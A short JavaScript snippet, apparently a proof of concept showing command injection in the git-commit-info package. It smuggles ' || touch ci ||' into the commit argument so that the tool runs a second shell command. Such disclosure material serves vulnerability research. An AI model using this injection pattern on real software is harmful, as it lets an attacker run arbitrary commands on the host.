const gitCommitInfo = require('git-commit-info')
// information of the latest commit in ./my_repo
gitCommitInfo({
  cwd: './my_repo',
  commit: '82442c2405804d7aa44e7bedbc0b93bb17707626' + " || touch ci ||", // a malicious file named ci will be crated
});
